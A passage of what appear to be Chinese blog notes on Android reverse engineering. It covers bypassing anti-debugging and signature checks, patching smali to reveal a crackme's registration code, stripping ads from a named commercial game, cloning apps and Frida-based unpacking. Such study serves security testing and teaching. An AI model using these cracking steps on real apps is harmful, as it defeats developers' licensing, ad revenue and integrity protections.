=fopen(name,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (fdname!=<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">while</span>(fgets(nameline,bufsize,fdname)) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (<span class="built_in">strstr</span>(nameline,<span class="string">&quot;android_server&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">int</span> ret=kill(pid,SIGKILL);</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            fclose(fdname),</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IDA调试可执行文件<br>IDA -&gt; Debugger -&gt; Run -&gt; Remote ARMLinux…<br>-&gt; 以下信息必填:<br>  Application: 文件路径+文件名<br>  Directory: 程序所在路径<br>  Hostname: 127.0.0.1  , Port: 运行android_server转发端口号<br>-&gt; ok之后程序处于挂起状态<br>-&gt; (android shell端执行)ps | grep 该程序名称(查看端口号,第一个数字字符串)<br>-&gt; cat /proc/端口号/status (此进程详细信息)</p><p>过掉反调试<br>(1) 动态调试把tracepid函数的返回值改为零,或者直接nop掉该函数<br>(2) 刷机,修改系统内核,永久绕过反调试</p><h3 id="轮循检测"><a href="#轮循检测" class="headerlink" title="轮循检测"></a>轮循检测</h3><p>反调试方法之一,保护程序代码会一直监视进程的tracepid是否发生变化,<br>不断轮循检测Tracepid的值,假如为0 -&gt; 没有被调试<br>假如不为0,说明当前进程正在被调试.</p><h3 id="self-debugger反调试原理"><a href="#self-debugger反调试原理" class="headerlink" title="self-debugger反调试原理"></a>self-debugger反调试原理</h3><ul><li><p>原理<br>(1) 当前进程就是父进程,也就是即将被调试的进程<br>(2) 通过父进程fork一个子进程<br>(3) 该子进程实现调试器功能<br>(4) 作为调试器的子进程附加父进程而禁止其他调试器来调试父进程</p></li><li><p>过滤self-debugger反调试<br>附加它的子进程<br>如果添加子进程后,直接用IDA附加调试,调试不上(可能有IDA反调试),双开IDA,找到创建进程的位置,<br>直接在Fork函数下断即可.</p></li></ul><h3 id="java层反调试"><a href="#java层反调试" class="headerlink" title="java层反调试"></a>java层反调试</h3><p><code>java层动态调试需要满足:</code><br><code>(1) 在AndroidMainfest.xml文件中,application标签下,Android:debuggable=true</code><br><code>(2) 系统默认调试,在build.prop(boot.img) , ro.debuggabel=1</code></p><ul><li><p>百度加固演示<br>将样本拖入jdax-gui进行反编译(会调用Debug.isDebuggerConnected函数检测程序被调试反调)</p></li><li><p>绕过java层反调试方法<br>AndroidKiller中搜索isDebugger… </p></li><li><blockquote><p>smail文件中找到判断语句(如: if nez 改为-&gt; if eqz不相等跳转改为相等跳转)</p></blockquote></li><li><blockquote><p>保存 -&gt; 打包 -&gt; 签名</p></blockquote></li></ul><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>(1) 接口类的创建<br>(2) 定义方法,实现接口类的类<br>(3) 实现接口类的方法<br>(4) 创建代理并实现类<br>(5) 实现接口后声明一个对象后进行实例,得到对象<br>(6) 在代理类里面定义两个方法分别是代理前,后<br>(7) 调用代理类里的方法,做出相应的修改(参数,返回值)<br>(8) MainActivity里实例化代理类<br>(9) 运行打印一下log日志信息</p><hr><h2 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h2><h3 id="混淆的概念"><a href="#混淆的概念" class="headerlink" title="混淆的概念"></a>混淆的概念</h3><p>通过一些工具对函数名,变量名,类名,字段名进行批量的重命名<br>但整体逻辑是清晰的</p><h3 id="ProGuard"><a href="#ProGuard" class="headerlink" title="ProGuard"></a>ProGuard</h3><p>检测和移除未使用的类,字段名,方法和属性<br>优化字节码,移除未使用到的代码指令</p><h2 id="资源混淆"><a href="#资源混淆" class="headerlink" title="资源混淆"></a>资源混淆</h2><p>MT管理器绕过资源文件的触发(捕鱼达人)<br>MT管理器 -&gt; data/app/程序包名<br>-&gt; 点击.apk查看<br>-&gt; 点击.dex文件<br>-&gt; dex编辑器++<br>-&gt;反编译完成(里面的方法修改后会出现星号)<br>-&gt; 修改完成把保存并退出(绿色表示修改成功)<br>-&gt; 双击覆盖安装</p><p>MT管理器原理: 基于压缩包进行反编译,可以反编译单独的dex</p><h2 id="签名验证"><a href="#签名验证" class="headerlink" title="签名验证"></a>签名验证</h2><p>签名修改后安装出现闪退(存在签名验证)<br>(1) 阅读签名验证源码<br>打开文件 -&gt; 开始分析java层 -&gt; 重新打包,回编译<br>获取包管理,从而获取签名信息<br>(2) 分析以及过掉签名验证<br>安装程序包 -&gt; 对程序包重新签名 -&gt; 安装签名过后的程序 -&gt; 开始分析<br>打开就提示错误 -&gt; 逻辑检查 OnCreate -&gt;native(so层检测)<br>-&gt; IDA打开lib目录下的so文件<br>-&gt; 搜索JNI_onload(没有JNI_onload,不是采用动态组成)<br>-&gt; 在搜索java_(有结果,双击分析)<br>-&gt; 看到getSignHashCode(点击)<br>-&gt; 看到getPackageManager , getPackageInfo , getPackageName(签名三兄弟)<br>-&gt; 还有signatures,hashcode(一块一块的函数的调用)<br>-&gt; F5看伪代码<br>-&gt; 上一层只传一个R0(env),第二个参数在java层代码,没有被static修饰,说明obj<br>-&gt; 右键Hide-casts 隐藏类型</p><h3 id="JNI-OnLoad简介"><a href="#JNI-OnLoad简介" class="headerlink" title="JNI_OnLoad简介"></a>JNI_OnLoad简介</h3><p>Java JNI有两种方法，一种是通过javah,获取一组带签名函数，然后实现这些函数。<br>这种方法很常用，也是官方推荐的方法。<br>还有一种就是JNI_OnLoad方法。<br>​<br>当Android的VM(Virtual Machine)执行到C组件(即<em>so档)里的System.loadLibrary()函数时，<br>首先会去执行C组件里的JNI_OnLoad()函数。<br>它的用途有二：<br>. 告诉VM此C组件使用那一个JNI版本。<br>  如果你的</em>.so档没有提供JNI_OnLoad()函数，VM会默认该*.so档是使用最老的JNI 1.1版本。<br>  由于新版的JNI做了许多扩充，如果需要使用JNI的新版功能，<br>  例如JNI 1.4的java.nio.ByteBuffer,就必须藉由JNI_OnLoad()函数来告知VM。</p><hr><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p>打包，编译和破解的流程是什么样的？ </p><ol><li><p>Android的生命周期<br>onCreate - onStart - onResume - onPause - onStop - onDestory - onRestart</p></li><li><p>Android的入口函数？<br>继承了application类中的attachContext,onCreate</p></li><li><p>xposed框架的原理及常用函数？<br>替换system/bin/app_process文件，app_process就是zygote进程文件，所以xposed通过替换zygote进程实现了控制手机上所有app进程<br>常用函数<br>（1）findAndHookMethod<br>（2）findAndHookConstructor hook构造函数<br>(3)findClass：使用指定的类加载器查找类<br>（4）findField : 在类中查找自动并将其设置为可访问<br>(5)CallMethod 调用给定对象的实例或静态方法<br>(6)newInstance 创建给定类的新实例</p></li><li><p>hook和注入有哪些？<br>hook：反射（在程序运行的时候，对任意一个类，都可以获取其方法及变量）<br>java的动态代理（smali注入）</p></li><li><p>反调试<br>Tracerpid不等于0<br>Ptrace自身.<br>IsDebuggerConnect。</p></li><li><p>加壳<br>加壳的另一种常用的方式是在二进制的程序中植入一段代码，在运行的时候优先取得程序的控制权，做一些额外的工作。大多数病毒就是基于此原理。加壳的程序经常想尽办法阻止外部程序或软件对加壳程序的反汇编分析或者动态分析，以达到它不可告人的目的。这种技术也常用来保护软件版权，防止被软件破解。 </p></li><li><p>了解反破解的技术<br>我目前掌握的技术有：<br>1，反模拟器<br>2，反静态代码分析器如：反jeb<br>应该也是有很多反ida的，也就是加壳。</p></li><li><p>安卓程序的加解密和数据传输分析、拆解、逆向等工作;<br>加解密：这就很多了，一般都是遇到后再折腾解密，而且解密代码和秘钥一般都在代码里面。 </p></li><li><p>Andorid本地提权获得root权限，一般真机是用recovery刷机包，但是病毒提权是怎么样的<br>目前掌握的一种提权的是像输入命令行一样输入su并且用pm提权<br>还有一种是修改init.rc文件</p></li><li><p>Android逆向能做什么？</p></li></ol><p> 破解APP，实现各种功能，二次打包。<br> 分析算法，一些数据处理算法，自己开发不会写，就可以用逆向借鉴一些功能和算法。<br> APP协议，实现数据的抓取，得到数据后定点投放广告和协议操作等。协议本身APP本身存在的漏洞和BUG，可以实现模拟数据发送，实现篡改（这个属于是BUG）。单纯安卓逆向只能分析APP端和服务器发送给你的本身的数据，服务器本身不返回的数据APP逆向是没办法的。WEB安全则可以提权，获得主动权，威胁更大。<br> APP客户端安全测试，扫描漏洞，可以解决上述问题。<br> APP加固，用于保护APP的安全。<br> APP病毒木马分析，这样才能写安全软件，保护手机系统的安全。反方向就是逃避检测规则，做到免杀。<br> ARM汇编指令集就是转换为最底层的机器语言，由CPU去执行的。<br> 物联网也是基于ARM汇编的底层，IOT安全也是未来的趋势。</p><ol start="11"><li><p>简单介绍一下Java层逆向？<br>JAVA开发（JAVA层） 主要用于协议部分，算法这一块需要用到，有部分还有C写的，只要接触到SO文件分析的都有C的影子。<br>系统源码分析部分，APP的启动分析。<br>APP一、二代加固。一代加固主要是隐藏JAVA代码（DEX文件）。二代加固主要是隐藏DEX文件里面的关键核心部分。C在加固部分应用得最多。<br>学习C的目的是让你更理解汇编指令。<br>SO文件是用C和C++写的代码编译后的文件。APP程序运行的时候安卓系统有接口调用SO文件。<br>NDK主要的功能就是让JAVA能够去访问底层的C++代码，是C代码和JAVA代码的一个调用。</p></li><li><p>能否简单介绍一下smali代码？<br>Dex文件反编译后的文件，得到Smali代码，可以用于分析代码、分析逻辑，知道别人软件的这个功能是怎么实现的。<br>Dex文件还可以反编译为JAR包，JAR包就是JAVA代码。</p></li><li><p>为什么用Smali代码不用JAVA代码分析<br>就是因为JAVA代码混淆比较严重，主要混淆是“函数名”，“类名”，“变量”，“包名”。<br>混淆机制是安卓程序员开发的，用于保护代码安全。混淆是属于内部保护机制，内部保护是通过内部去处理的，程序是按照正常流程去运行的，不存在加固后的解壳环节。内部保护安全性还是比较弱，没有外部保护的安全高。<br>Smali代码和JAVA代码的关联就是Smali代码不易懂，开发比较负责，JAVA代码开发效率高。Smali代码属于中间层处理系统，底层是汇编。Dalvik指令集取到一个转换的工作，转换为ARM汇编语言。</p></li><li><p>常见的hook框架，你怎么理解呢？<br>Xposed框架和frida都属于HOOK框架。<br>frida协议分析方向比较多，主要用于测试。JAVA层和SO层的HOOK，比较复杂，要会逆向分析，使用难度高。</p></li></ol><p>15.SE Android安全机制所要保护的对象是什么？<br>SE Android安全机制所要保护的对象是系统中的资源，这些资源分布在各个子系统中.<br>实际上，系统中需要保护的资源非常多，除了文件之外，还有进程、socket和IPC等。</p><hr><h2 id="逆向思维"><a href="#逆向思维" class="headerlink" title="逆向思维"></a>逆向思维</h2><p>获取注册码<br>一般有三种方式，打 log，动态调试 smali，自己写注册机。<br>打 log 日志<br>其实在逆向过程中，注入 log 代码是很常见的操作。适当的打 log，可以很好的帮助我们理解代码执行流程。在这里例子中，最终会拿我们输入的注册码和正确的注册码进行比较，在比较的时候我们就可以通过打 log 把正确的注册码打印出来，这样我们就可以直接输入注册码进行注册了。</p><p>打 log 的 smali 代码是固定的，一般格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const-string vX, &quot;TAG&quot;invoke-static &#123;vX,vX&#125;, Landroid/util/Log;-&gt;e(Ljava/lang/String;Ljava/lang/String;)I</span><br></pre></td></tr></table></figure><p>vX 都是指寄存器。把这两行代码加到注册码的检验操作之前就可以了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.line 63.local v6, &quot;userSN&quot;:Ljava/lang/String;  # userSN = sb.toString()const-string v8, &quot;TAG&quot;invoke-static &#123;v8,v6&#125;, Landroid/util/Log;-&gt;e(Ljava/lang/String;Ljava/lang/String;)I# userSN.equalsIgnoreCase(sn)invoke-virtual &#123;v6, p2&#125;, Ljava/lang/String;-&gt;equalsIgnoreCase(Ljava/lang/String;)Z</span><br><span class="line"></span><br><span class="line">const-string v8, &quot;TAG&quot;</span><br><span class="line">invoke-static &#123;v8,v6&#125;, Landroid/util/Log;-&gt;e(Ljava/lang/String;Ljava/lang/String;)I</span><br><span class="line"></span><br><span class="line"># userSN.equalsIgnoreCase(sn)</span><br><span class="line">invoke-virtual &#123;v6, p2&#125;, Ljava/lang/String;-&gt;equalsIgnoreCase(Ljava/lang/String;)Z</span><br></pre></td></tr></table></figure><p>再次重新打包运行，输入用户名和注册码，会得到日志</p><p>动态调试 smali<br>动态调试 smali 来的更加直截了当。不管是你自己写程序，还是做逆向，debug 永远都是快速理清逻辑的好方法。smali 也是可以进行动态调试的，依赖于 Smalidea 插件，你可以在 Android Studio 的 Plugin 中进行安装，也可以下载下来本地安装。</p><p>第一步，我们要保证我们的应用处于 debug 版本，在 AndroidManifest.xml 中加上 android:debuggable=”true” 即可，重打包再安装到手机上。</p><p>第二步，将之前反编译得到的 smali 文件夹导入 Android Studio 或者 IDEA，并配置远程调试环境。选择 Run -&gt; Edit Configurations，点击左上角 + 号，选择 Remote，弹出配置窗口，如下图所示：<br><img src="2.png"></p><p>注意记住自己填写的端口号，端口号不是固定的，只要未被占用即可。配置完成后，记得在合适的地方打上断点，我这里就在 checkSN() 方法内打上断点。</p><p>第三步，命令行启动进程调试等待模式。首先执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -D -n com.droider.crackme0201/.MainActivity</span><br></pre></td></tr></table></figure><p>然后建立端口转发，输入如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:8700 jdwp:pid</span><br></pre></td></tr></table></figure><p>用你自己的应用的 pid 替换进去。关于 pid 的获取，可以通过 ps 和 grep 组合：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell ps | grep com.droider.crackme0201u0_a364   30110 537   2166480 30204 futex_wait 0000000000 S com.droider.crackme0201</span><br></pre></td></tr></table></figure><p>这里的 pid 就是 30010 。</p><p>最后在 Android Studio 或 IDEA 中启动 debug 。 点击 Run -&gt; Debug，应用就进入调试模式了。之后的操作就和开发中的 debug 模式一模一样了。我们可以在运行中看到寄存器中的值，运行逻辑一览无遗。运行至注册码校验处的断点，截图如下：</p><p>640?wx_fmt=png<br>userName 是用户名，sn 是输入的注册码，userSN 是正确的注册码。</p><hr><h1 id="adb的相关使用"><a href="#adb的相关使用" class="headerlink" title="adb的相关使用"></a>adb的相关使用</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">adb shell dumpsys activity top //显示当前页的activity.</span><br><span class="line">adb shell dumpsys package 包名 //获取包信息</span><br><span class="line">adb shell dumpsys meminfo 包名 //获取当前应用程序的内存数据</span><br><span class="line">adb shell dumpsys dbinfo packagename //获取数据库文件</span><br><span class="line">adb shell  pm list packages //列出当前所有已安装的程序包名</span><br><span class="line">adb shell pm path packagename //获取指定程序所在的路径</span><br><span class="line">adb shell dumpsys window | findstr mCurrentFocus //当前应用包名</span><br><span class="line"></span><br><span class="line">adb pull //设备中文件放到本地</span><br><span class="line">adb push //本地文件放到设备中</span><br><span class="line">adb shell screencap -p 截图文件路径/.png //截图</span><br><span class="line">adb shell sceenrecord 视频保存路径/.mp4  //视屏录制</span><br><span class="line">adb shell input text <span class="string">&#x27;q0o0p&#x27;</span>//可以模拟物理按键,虚拟键盘,滑动,滚动</span><br><span class="line">adb forward [(远程端)协议:端口号] [(客户端)协议:端口号] //用于ida调试</span><br><span class="line">adb jdwp//查看设备中可以被调试的应用的进程号</span><br><span class="line">adb logcat -s tag //查看当前日志信息</span><br><span class="line">adb logcat|findstr pname/pid/keyword //adb logcat|findstr com.q0o0p</span><br><span class="line"></span><br><span class="line">//过滤 Logcat 输出，以特定的应用程序为目标：</span><br><span class="line">$ adb logcat | grep <span class="string">&quot;<span class="subst">$(adb shell ps | grep &lt;package-name&gt; | awk &#x27;&#123;print $2&#125;&#x27;)</span>&quot;</span></span><br><span class="line">//备份过程完成后，ab 文件将在您的工作目录中。运行以下命令将 ab 文件转换为 tar 文件。</span><br><span class="line">$ dd <span class="keyword">if</span>=mybackup.ab bs=24 skip=1|openssl zlib -d &gt; mybackup.tar</span><br><span class="line">//如果您得到错误 openssl:Error: <span class="string">&#x27;zlib&#x27;</span> is an invalid <span class="built_in">command</span>。您可以尝试使用 Python代替。</span><br><span class="line">$ dd <span class="keyword">if</span>=backup.ab bs=1 skip=24 | python -c <span class="string">&quot;import </span></span><br><span class="line"><span class="string">zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))&quot;</span> &gt; backup.tar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">run-as [package name]//非root设备中查看指定debug模式包名应用沙盒数据</span><br><span class="line">ps |grep //查看设备的进程信息,ps |grep ocm.q0o0p</span><br><span class="line">ps -t [pid] //查看pid对应的线程信息,ps -t 11798</span><br><span class="line">ps clear [package name] //清空一个应用的数据</span><br><span class="line">am start -n [包(package)名]/[包名].[活动(activity) 名称]//启动一个应用</span><br><span class="line">am startservice</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="除去广告"><a href="#除去广告" class="headerlink" title="除去广告"></a>除去广告</h2><p>一、删除广告网络权限（去除广告）,在AndroidManifest.xml中删除如下权限信息：<br>与网络权限有关的五种</p><ol><li><p>允许应用程序改变网络状态<br>CHANGE_NETWORK_STATE</p></li><li><p>允许应用程序改变WiFi的状态<br>CHANGE_WIFI_STATE</p></li><li><p>允许应用程序改变有关网络的访问状态<br>ACCESS_NETWORK_STATE</p></li><li><p>允许应用程序访问WiFi网卡的网络信息<br>ACCESS_WIFI_STATE</p></li><li><p>允许应用程序完全使用网络（不能删除，会导致app无法运行）</p></li></ol><p>二、修改app入口页面去广告<br>检查AndroidManifest.xml是否同时包括<br><action android:name="android.intent.action.VIEW"/><br><category android:name="android.intent.category.DEFAULT"/><br>可以看到游戏的入口页面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android:=<span class="string">&quot;com.popcap.pvz2cthd360.wxapi.WXEntryActivity&quot;</span></span><br><span class="line"><span class="attr">android</span>:name=<span class="string">&quot;com.popcap.pvz2cthd360.SexyAppActivity&quot;</span></span><br></pre></td></tr></table></figure><p>adb shell dumpsys activity top //查看当前页面入口<br><img src="1.png"></p><p>将app入口页面替换成当前入口页面（没有广告的入口页面）</p><h2 id="更改图标及apk名字"><a href="#更改图标及apk名字" class="headerlink" title="更改图标及apk名字"></a>更改图标及apk名字</h2><p>AndroidKiller中搜索<code>android:icon -&gt; 看到ic_launcher -&gt; 在.MF文件中搜索 -&gt; 找到icon路径</code></p><p>java -jar apktool d q0o0p.apk<br>目录下面生成一个dist目录，里面就是重打包之后的apk</p><h2 id="应用分身（修改apk包名）"><a href="#应用分身（修改apk包名）" class="headerlink" title="应用分身（修改apk包名）"></a>应用分身（修改apk包名）</h2><p>找到AndroidManifest.xml文件<br><code>package=&quot;&quot;</code>修改包名<br>修改proivder中的”android:authorities”属性值<br>注意：<br>（1）只修改包名会引发内容提供冲突<br>修改方案：<br>  修改proivder中的”android:authorities”属性值<br>（2）签名不一致导致无法运行<br>修改方案：<br>  使用相同的工具，统一进行签名<br>（3）只修改内部包名，导致程序崩溃<br>修改方案：<br>  全局修改</p><hr><h2 id="定位关键代码"><a href="#定位关键代码" class="headerlink" title="定位关键代码"></a>定位关键代码</h2><p>（1）资源反馈法<br>如：错误提示，运行提示 -&gt; 搜索字符串<br>String.xml -&gt; R.java -&gt; id -&gt;smail或IDA中搜索<br>（2）特征函数法<br>调用相关api函数完成<br>（3）顺序查看法<br>AndroidManifest.xml -&gt; 主Activity界面 -&gt; 掌握软件执行流程<br>（4）代码注入法<br>插桩（插入log/查看logcat/分析加解密）解密程序数据的时候使用<br>（5）栈跟踪法（动态调试/函数调用流程）<br>输出运行时栈调用跟踪信息，查看函数调用序列，理解方法的执行流程。</p><p>搜索关键信息找不到：</p><ul><li><p>字符串在so层</p></li><li><p>字符串被加密了</p></li><li><p>结合服务器，服务器返回，本地显示</p></li></ul><p>AndroidManifest.xml中（android：name=””）获取主页面信息 -&gt; smail文件中查找该页面 -&gt; 找到OnCreat()方法 -&gt;<br>起始位置插入代码（.locals 7 下一行，右键插入代码，toast输出，这是一个消息提示）-&gt;<br>点击保存，并进行回编译（这就是代码注入法,根据提示信息知道app是否可以逆向分析）-&gt;<br>手机端获取广告页Activity(adb shell dumpsys activity top ) -&gt; 在主页中找到广告页activity -&gt;<br>将StatrtActivity（由一个页面跳转到另一个页面）整行注释（AndroidKiller使用Shift+3注释[#号]）</p><h2 id="签名校验"><a href="#签名校验" class="headerlink" title="签名校验"></a>签名校验</h2><p>关键词有sign，signature，checkSign，signCheck，getPackageManager，getPackageInfo，verify，same等。</p><h2 id="DDMS-工具使用（虚拟机调试监控服务）"><a href="#DDMS-工具使用（虚拟机调试监控服务）" class="headerlink" title="DDMS 工具使用（虚拟机调试监控服务）"></a>DDMS 工具使用（虚拟机调试监控服务）</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ol><li>提供截屏</li><li>查看线程和堆栈信息</li><li>查看logcat日志<br>去广告：<br>打开DDMS -&gt; 添加过滤器 -&gt; 浏览日志信息，找到https://广告链接</li></ol><p>-&gt; 替换为127.0.0.1</p><h3 id="真机调试"><a href="#真机调试" class="headerlink" title="真机调试"></a>真机调试</h3><ul><li>使用mprop<br>getprop ro.product.cpu.abi<br>下载mprop :<a href="https://github.com/wpvsyou/mprop/blob/master/arm64-v8a/mprop">https://github.com/wpvsyou/mprop/blob/master/arm64-v8a/mprop</a><br>adb -s fea4b345 push mprop /data/local/tmp</li></ul><p>手机端:<br>chmod 755 mprop<br>./mprop ro.debuggable 1</p><ul><li><p>magisk(重启失效)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adb shell <span class="comment">#adb进入命令行模式</span></span><br><span class="line">su <span class="comment">#切换至超级用户</span></span><br><span class="line">magisk resetprop ro.debuggable 1</span><br><span class="line">stop;start; <span class="comment">#一定要通过该方式重启</span></span><br><span class="line">getprop ro.debuggable <span class="comment">#显示1</span></span><br></pre></td></tr></table></figure></li><li><p>MagiskHide Props Config模块修改(永久有效)<br>Magisk中搜索MagiskHide Props Config模块并安装</p></li></ul><h2 id="log插桩调试smail代码"><a href="#log插桩调试smail代码" class="headerlink" title="log插桩调试smail代码"></a>log插桩调试smail代码</h2><h3 id="应用程序入口页面插入信息"><a href="#应用程序入口页面插入信息" class="headerlink" title="应用程序入口页面插入信息"></a>应用程序入口页面插入信息</h3><p>将apk拖入AndroidKiller<br>工程信息栏找到入口 -&gt; 找到OnCreate函数<br>在<code>.prologue</code>(代码开始的位置) 下一行插入 -&gt; 右键 -&gt; 插入代码 -&gt; log信息输出</p><h3 id="程序入口点插入log信息"><a href="#程序入口点插入log信息" class="headerlink" title="程序入口点插入log信息"></a>程序入口点插入log信息</h3><p>工程管理器 -&gt; AndroidMainfest.xml -&gt; application -&gt;<br>android:name= “程序入口点” -&gt; smail中找到 -&gt; OnCreat()<br>-&gt; .prologue 下面插入log信息 -&gt; DDMS添加过滤器（主要填写过滤器名字和包名信息）查看 -&gt; 根据插入的日志信息进行筛选（应用程序执行入口页面早于程序入口页面）</p><p><code>注意: 局部变量寄存器个数为0或不够使用时，需要进行修改，否则app会停止运行</code></p><h2 id="栈跟踪法（动态调试）"><a href="#栈跟踪法（动态调试）" class="headerlink" title="栈跟踪法（动态调试）"></a>栈跟踪法（动态调试）</h2><p>adb shell dumpsys activity top //获取包名<br>打开DDMS并添加过滤器（上层是被调用者，下层是调用者，从下往上调用）<br>打开AndroidKiller -&gt; 工程信息 -&gt; 入口 -&gt; 函数loadData -&gt; .prologue下面右键插入StackTrace栈跟踪</p><h2 id="app-去除弹窗"><a href="#app-去除弹窗" class="headerlink" title="app 去除弹窗"></a>app 去除弹窗</h2><p>AndroidKiller -&gt; 工程管理器 -&gt; 打开apktool.yml(工程配置信息) -&gt;<br>更改versionCode:’999’(版本信息是否大于当前发布的最新版本)</p><h2 id="Method-Profiling方法剖析"><a href="#Method-Profiling方法剖析" class="headerlink" title="Method Profiling方法剖析"></a>Method Profiling方法剖析</h2><p>基于热点分析和性能优化，除了可以记录每一个函数占用cpu的时间外，还可以跟踪所有函数调用关系，并提供比栈跟踪法更详尽的函数调用序列报告。</p><p>DDMS -&gt; 第五个按钮，Profilling Options -&gt;<br> 第一个默认设置过滤方法的个数，默认1000条，第二个没有过滤,选中第一个开始捕捉 -&gt; 手机端，验证码输入捕捉，输入完成后，DDMS暂停捕捉，停止以后等待一下<br> -&gt; 弹出页面（Name：函数调用流程）-&gt; find:OnClick</p><p> 根据DDMS中的路径AndroidKiller找到该方法<br> 当前执行方法</p><ul><li>Parent（父节点）<br>当前方法的上层调用</li><li>Children （子节点）<br>当前方法的下层调用</li></ul><h2 id="AndroidStudio-smalidea插件动态调试"><a href="#AndroidStudio-smalidea插件动态调试" class="headerlink" title="AndroidStudio + smalidea插件动态调试"></a>AndroidStudio + smalidea插件动态调试</h2><p>导入完整的smali代码<br>设置所需条件<br>设置断点<br>移动设备连接至PC端，运行待调试的apk<br>运行至代码处的断点时，触发断点</p><hr><h2 id="ART虚拟机"><a href="#ART虚拟机" class="headerlink" title="ART虚拟机"></a>ART虚拟机</h2><p>什么是ART虚拟机，和JVM/DVM有什么不同？</p><p>首先了解JIT（Just In Time，即时编译技术）和AOT(Ahead Of Time，预编译技术)两种编译模式。</p><p>JIT以JVM为例，javac把程序源码编译成JAVA字节码，JVM通过逐条解释字节码将其翻译成对应的机器指令，逐条读入，逐条解释翻译，执行速度必然比C/C++编译后的可执行二进制字节码程序慢，为了提高执行速度，就引入了JIT技术，JIT会在运行时分析应用程序的代码，识别哪些方法可以归类为热方法，这些方法会被JIT编译器编译成对应的汇编代码，然后存储到代码缓存中，以后调用这些方法时就不用解释执行了，可以直接使用代码缓存中已编译好的汇编代码。这能显著提升应用程序的执行效率。（安卓Dalvik虚拟机在2.2中增加了JIT）<br>相对的AOT就是指C/C++这类语言，编译器在编译时直接将程序源码编译成目标机器码，运行时直接运行机器码。</p><p>Dalvik虚拟机执行的是dex字节码，ART虚拟机执行的是本地机器码</p><p>Dalvik执行的是dex字节码，依靠JIT编译器去解释执行，运行时动态地将执行频率很高的dex字节码翻译成本地机器码，然后在执行，但是将dex字节码翻译成本地机器码是发生在应用程序的运行过程中，并且应用程序每一次重新运行的时候，都要重新做这个翻译工作，因此，及时采用了JIT，Dalvik虚拟机的总体性能还是不能与直接执行本地机器码的ART虚拟机相比。</p><p>安卓运行时从Dalvik虚拟机替换成ART虚拟机，并不要求开发者重新将自己的应用直接编译成目标机器码，也就是说，应用程序仍然是一个包含dex字节码的apk文件。所以在安装应用的时候，dex中的字节码将被编译成本地机器码，之后每次打开应用，执行的都是本地机器码。移除了运行时的解释执行，效率更高，启动更快。（安卓在4.4中发布了ART运行时）</p><p>ART优点：<br>①系统性能显著提升<br>②应用启动更快、运行更快、体验更流畅、触感反馈更及时<br>③续航能力提升<br>④支持更低的硬件</p><p>ART缺点<br>①更大的存储空间占用，可能增加10%-20%<br>②更长的应用安装时间</p><p>总的来说ART就是“空间换时间”</p><hr><p>ART模式下基于frida框架脱壳技术原理<br>不同于传统java应用层hook dump出dex文件，而是从系统层面拦截hook到OpenMemory函数进行dump。 一般安卓加载代码都是通过classloader来装取本地代码到内存中去的。<br>ClassLoader有两种加载方式：<br>1.通过路径寻找本地代码，然后装入内存<br>基本的源码顺序是BaseDexClassLoader——&gt;DexPathList——&gt;makeDexElement——&gt;loadDexFile—&gt;dDexFile.loadDex 最后DexFile中有个native方法，OpenDexFileNative对应了DexFile_openDexFileNative方法，其中的OpenDexFileFormOat就是最主要的方法了。<br>2.直接映射到内存中去<br>4.x中DexFile.loadDex这个方法已经摒弃了，使用的是</p><p>native private static int openDexFile(byte[] fileContents);<br>然而这个方法在5.0中也已经摒弃了，在native层中依旧存在于/art/runtime/dex_file.cc中。其方法为OpenMemory函数。我们只需要hook 拦截到这个方法dump出dex文件就ok。下面就展开介绍下常见的几个针对这种脱壳模式的frida框架脱壳工具脚本。</p><hr><h2 